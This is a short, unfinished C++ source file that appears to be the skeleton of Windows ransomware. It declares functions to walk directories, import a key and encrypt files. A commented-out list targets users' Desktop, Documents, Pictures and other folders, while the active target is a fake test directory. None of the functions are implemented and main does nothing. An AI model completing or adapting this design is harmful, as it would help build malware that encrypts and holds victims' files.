#include <iostream>
#include <Windows.h>
#include <string>


//Global variables and a plainkeyblob

//const char* targetDirs[] = { "Desktop","Documents","Downloads","Favorites","Music","Pictures", "Videos" };

LPCWSTR targetDirs[] = { L"C:\\dev\\fake_dir" };




//Function declarations

bool traverse(LPCWSTR targetDir, int nLevel = 0);
HCRYPTKEY keyimport();
int encryptFile(LPCWSTR srcFile, LPCWSTR dstFile, HCRYPTKEY clé, HCRYPTPROV context);

// main : 

//Use of import with the plaintextkey[] byte array, which returns a key

//Use of a for loop for every entry in the target dirs :
//traverse the directory and apply encrypt to the FILES only

int wmain() {

	//HCRYPTKEY clé = NULL;
	//HPROV contexte = NULL;
	//keyimport(clé,context);
	// 
	//DWORD username = GetUserNameW(NULL, &username);

	/*for (LPCWSTR singledir : targetDirs) {
		
		traverse(singledir);
	}*/




	return 0;
}